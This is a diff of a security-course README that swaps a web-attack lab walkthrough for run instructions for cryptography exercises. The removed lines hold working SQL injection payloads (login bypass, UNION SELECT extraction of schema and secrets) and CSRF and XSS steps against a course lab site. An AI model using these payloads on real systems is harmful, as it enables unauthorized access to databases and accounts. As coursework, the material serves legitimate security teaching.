@@ -13,135 +13,65 @@ CP2 Deadline --- Thursday, November 3rd, 6:00PM
 None
 
 ## Implementation
-#### 2.2.1.1
-Type the following command in `Username`
+#### 3.1.1 Exercise
+Type the following command to run the python script `3.1.1.py`
 ```
-victim
-```
-Type the following command in `Password`
-```
-' OR 1=1 -- 
-```
-#### 2.2.1.2
-Type the following command in `Username`
-```
-victim
-```
-Type the following command in `Password`
-```
-\' OR 1=1 -- 
-```
-#### 2.2.1.3
-Write a python script to mine `md5` hash
-
-Type the following command to run the python script `2.2.1.3.py`
-```
-./2.2.1.3.py
-```
-The `passwd` got from the python script are
-* `61873882145751551400929987756087961` [35-digit]
-* `1107388038190758764683658965752877062` [37-digit]
-
-
-#### 2.2.1.4
-##### 1. Figure out how many columns there are in the table with the following command
-```
-' OR 1=1 ORDER BY 1; -- 
-' OR 1=1 ORDER BY 2; -- 
-' OR 1=1 ORDER BY 3; -- 
-' OR 1=1 ORDER BY 4; -- 
-' OR 1=1 ORDER BY 5; -- 
-```
-The last command will give you an error. Therefore, there are 4 columns in the table.
-
-##### 2. Use the following command to get the `Database Name`
-```
-' UNION SELECT NULL,NULL,NULL,DATABASE(); -- 
+./3.1.1.py
 ```
 
-##### 3. Use the following command to get the `Database Version`
+#### 3.1.2 Substitute Cipher
+Type the following command to run the python script `sol_3.1.2.py`
 ```
-' UNION SELECT NULL,NULL,NULL,version(); -- 
+./sol_3.1.2.py 3.1.2_sub_ciphertext.txt 3.1.2_sub_key.txt sol_3.1.2.txt
 ```
-Or use the following alternative command
+or
 ```
-' UNION SELECT NULL,NULL,NULL,@@version; -- 
+python3 sol_3.1.2.py 3.1.2_sub_ciphertext.txt 3.1.2_sub_key.txt sol_3.1.2.txt
 ```
+Change the `DEBUG` flag in the python script to `True` to print info to terminal
 
-##### 4. Use the following command to get all `Table` in the Database
+#### 3.1.3 AES: Decrypting AES
+Type the following command to run the python script `sol_3.1.3.py`
 ```
-' UNION SELECT NULL,NULL,NULL,GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='proj2_inject3'; --
+./sol_3.1.3.py 3.1.3_aes_ciphertext.hex 3.1.3_aes_key.hex 3.1.3_aes_iv.hex sol_3.1.3.txt
 ```
+or
+```
+python3 sol_3.1.3.py 3.1.3_aes_ciphertext.hex 3.1.3_aes_key.hex 3.1.3_aes_iv.hex sol_3.1.3.txt
+```
+Change the `DEBUG` flag in the python script to `True` to print info to terminal
 
-##### 5. Use the following command to get all `Column` in Table `HINT`
+#### 3.1.4 AES: Breaking A Weak AES Key
+Type the following command to run the python script `3.1.4.py`
 ```
-' UNION ALL SELECT NULL,NULL,NULL,GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='HINT'; -- 
+./3.1.4.py
 ```
-The `column_name` got from Table `HINT` are _id_ and _message_
-
-Use the following command to get `message` from Table `HINT` with `id=1`
+or
 ```
-' UNION SELECT NULL,NULL,NULL,message FROM HINT WHERE id='1'; -- 
-```
-The `message` from table `HINT` with `id=1` is _go to table SECRET and get a secret string from row with your md5(netid)_
-
-Use the following command to get all `Column` in Table `SECRET`
-```
-' UNION ALL SELECT NULL,NULL,NULL,GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='SECRET'; -- 
-```
-The `column_name` got from Table `SECRET` are _hash_, _id_, and _secret_
-
-Use the following command to get `md5(netid)`
-```
-./md5.py
+python3 3.1.4.py
 ```
 
-Then, use the following command to get `secret` from Table `SECRET` with the `hash=md5(netid)`
+#### 3.1.5 Decrypting a ciphertext with RSA
+Type the following command to run the python script `sol_3.1.5.py`
 ```
-' UNION SELECT NULL,NULL,NULL,secret FROM SECRET WHERE hash='3168622a73961f1d17b1a105be567177'; -- 
+./sol_3.1.5.py 3.1.5_RSA_ciphertext.hex 3.1.5_RSA_private_key.hex 3.1.5_RSA_modulo.hex sol_3.1.5.hex
 ```
+or
+```
+python3 sol_3.1.5.py 3.1.5_RSA_ciphertext.hex 3.1.5_RSA_private_key.hex 3.1.5_RSA_modulo.hex sol_3.1.5.hex
+```
+Change the `DEBUG` flag in the python script to `True` to print info to terminal
 
-#### 2.2.2.1
-Create &lt;iframe&gt; that displays nothing
-
-&lt;form&gt; `action`=http://bungle-cs461.csl.illinois.edu/login
-
-Log in with following infomation:
-* `csrfdefense`=0
-* `xssdefense`=5
-* `username`=attacker
-* `password`=l33th4x
-
-#### 2.2.2.2
-Create &lt;iframe&gt; that displays nothing
-
-Go to original [`Bungle` website](http://bungle-cs461.csl.illinois.edu/)
-
-Right click on search window, and click `Inspect Element`
-
-* The `name`=q
-
-Right click on either `username` or `password` window, and click `Inspect Element`
-
-* &lt;input type="hidden" name="csrf_token" value="9165db97e970e7d9facd256db1fdf2f8"&gt;
-
-Submit 2 HTML &lt;form&gt; with function `submitForm()`
-* Both of them use `target`=ifrm
-* The first form use `action`=http://bungle-cs461.csl.illinois.edu/search
-* The second form use `action`=http://bungle-cs461.csl.illinois.edu/login
-
-#### 2.2.3.1
-Go to Website [here](http://bungle-cs461.csl.illinois.edu/multivac/?name=INSERT%20ATTACK%20HERE)
-
-Right click on the hyperlink `Click me` and click `Inspect Element`
-
-* &lt;a href="http://cs.illinois.edu/"&gt;Click me&lt;/a&gt;
-
-Use the function `getElementsByTagName` to search for the first `a` and replace its `href` with the following
-
-* http://ece.illinois.edu/
-
-#### 2.2.3.2
+#### 3.1.6 Weak Hashing Algorithm
+Type the following command to run the python script `sol_3.1.6.py`
+```
+./sol_3.1.6.py 3.1.6_input_string.txt sol_3.1.6.txt
+```
+or
+```
+python3 sol_3.1.6.py 3.1.6_input_string.txt sol_3.1.6.txt
+```
+Change the `DEBUG` flag in the python script to `True` to print info to terminal
 
 ## Developers
 * Hongbo Zheng [NetID: hongboz2]
